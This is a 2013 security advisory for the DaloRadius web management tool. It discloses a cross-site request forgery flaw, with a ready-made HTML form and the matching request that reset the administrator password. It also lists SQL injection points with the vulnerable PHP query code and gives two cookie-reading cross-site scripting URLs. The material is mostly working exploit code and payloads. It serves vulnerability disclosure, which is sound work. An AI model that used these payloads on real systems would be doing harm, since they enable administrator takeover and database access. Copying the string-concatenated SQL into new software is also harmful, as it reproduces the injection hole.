# Software      : DaloRadius    SQLi / CSRF / XSS                                                                                                            
# Author        : Saadat Ullah , saadi_linux@rocketmail.com                               
# Author home  : http://security-geeks.blogspot.com
# Date          : 15/3/13   
# Vendors  : http://www.daloradius.com/ 
# Download Link : http://sourceforge.net/projects/daloradius/   
                                                                                     
-------------------------------------------------------------------------
+---+[ CSRF Change Admin Password ]+---+

DaloRadius Is not Using Any Security Tokens To Protect Againts CRSF.It is vuln to CRSF on All Locations.
Some OF them..
Change Admin Password

<form action="daloradius/config-operators-edit.php" method="post">
        <input type="hidden" value="administrator" name="operator_username" />

<div class="tabber">

     <div class="tabbertab" title="Operator Info">

  <fieldset>
  
    <h302></h302>
    <br/>

                <label for=&#039;operator_password&#039; class=&#039;form&#039;></label>
                <input name=&#039;password&#039; id=&#039;password&#039;
    type=&#039;hidden&#039;      value=&#039;radius1&#039; tabindex=101 />
                <br/>

                <br/><br/>
                <hr><br/>

                <input type=&#039;submit&#039; name=&#039;submit&#039; value=&#039;Apply&#039; class=&#039;button&#039; />

Poc
Header
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://localhost/daloradius/config-operators-edit.php?operator_username=administrator
Cookie: PHPSESSID=5f528764d624db129645be2e9
Content-Type: application/x-www-form-urlencoded
Content-Length: 3540

Post Data:
operator_username=administrator&password=radius1&submit=Apply

+---+[ SQL Injection ]+---+

Their are multiple SQLI in the script some are..
http://localhost/daloradius/acct-ipaddress.php?orderBy=[SQLi]
http://localhost/daloradius/acct-ipaddress.php?ipaddress=[SQLi]
http://localhost/daloradius/acct-date.php?orderBy=[SQLi]
http://localhost/daloradius/acct-date.php?username=[SQLi] etc

Proof Of Concept
in acct-ipaddress.php

isset($_GET[&#039;orderBy&#039;]) ? $orderBy = $_GET[&#039;orderBy&#039;] : $orderBy = "radacctid";
  isset($_GET[&#039;orderType&#039;]) ? $orderType = $_GET[&#039;orderType&#039;] : $orderType = "asc";  


  isset($_GET[&#039;ipaddress&#039;]) ? $ipaddress = $_GET[&#039;ipaddress&#039;] : $ipaddress = "";

  .
  .
  .
 $sql = "SELECT ".$configValues[&#039;CONFIG_DB_TBL_RADACCT&#039;].".RadAcctId, ".$configValues[&#039;CONFIG_DB_TBL_DALOHOTSPOTS&#039;].".name as hotspot, ".$configValues[&#039;CONFIG_DB_TBL_RADACCT&#039;].".UserName, radacct.FramedIPAddress, ".$configValues[&#039;CONFIG_DB_TBL_RADACCT&#039;].".AcctStartTime, ".$configValues[&#039;CONFIG_DB_TBL_RADACCT&#039;].".AcctStopTime, radacct.AcctSessionTime, ".$configValues[&#039;CONFIG_DB_TBL_RADACCT&#039;].".AcctInputOctets, ".$configValues[&#039;CONFIG_DB_TBL_RADACCT&#039;].".AcctOutputOctets, ".$configValues[&#039;CONFIG_DB_TBL_RADACCT&#039;].".AcctTerminateCause, ".$configValues[&#039;CONFIG_DB_TBL_RADACCT&#039;].".NASIPAddress FROM ".$configValues[&#039;CONFIG_DB_TBL_RADACCT&#039;]." LEFT JOIN ".$configValues[&#039;CONFIG_DB_TBL_DALOHOTSPOTS&#039;]." ON ".$configValues[&#039;CONFIG_DB_TBL_RADACCT&#039;].".calledstationid = ".$configValues[&#039;CONFIG_DB_TBL_DALOHOTSPOTS&#039;].".mac WHERE FramedIPAddress=&#039;$ipaddress&#039;;";


In acct-date.php
if ( (isset($_GET[&#039;username&#039;])) && ($_GET[&#039;username&#039;]) ) {
    $username = $_GET[&#039;username&#039;];



  $sql = "SELECT ".$configValues[&#039;CONFIG_DB_TBL_RADACCT&#039;].".RadAcctId, ".$configValues[&#039;CONFIG_DB_TBL_DALOHOTSPOTS&#039;].".name as hotspot, ".$configValues[&#039;CONFIG_DB_TBL_RADACCT&#039;].".UserName, ".$configValues[&#039;CONFIG_DB_TBL_RADACCT&#039;].".FramedIPAddress, ".$configValues[&#039;CONFIG_DB_TBL_RADACCT&#039;].".AcctStartTime, ".$configValues[&#039;CONFIG_DB_TBL_RADACCT&#039;].".AcctStopTime, ".$configValues[&#039;CONFIG_DB_TBL_RADACCT&#039;].".AcctSessionTime, ".$configValues[&#039;CONFIG_DB_TBL_RADACCT&#039;].".AcctInputOctets, ".$configValues[&#039;CONFIG_DB_TBL_RADACCT&#039;].".AcctOutputOctets, ".$configValues[&#039;CONFIG_DB_TBL_RADACCT&#039;].".AcctTerminateCause, ".$configValues[&#039;CONFIG_DB_TBL_RADACCT&#039;].".NASIPAddress FROM ".$configValues[&#039;CONFIG_DB_TBL_RADACCT&#039;]." LEFT JOIN ".$configValues[&#039;CONFIG_DB_TBL_DALOHOTSPOTS&#039;]." ON ".$configValues[&#039;CONFIG_DB_TBL_RADACCT&#039;].".calledstationid = ".$configValues[&#039;CONFIG_DB_TBL_DALOHOTSPOTS&#039;].".mac WHERE AcctStartTime>&#039;$startdate&#039; and AcctStartTime<&#039;$enddate&#039; and UserName like &#039;$username&#039;;";



+---+[ XSS ]+---+
http://localhost/daloradius/rep-logs-daloradius.php?daloradiusLineCount=50&daloradiusFilter=<script>alert(document.cookie);</script>
http://localhost/daloradius/mng-search.php?username=<script>alert(document.cookie);</script>

#Independent Pakistani Security Researcher

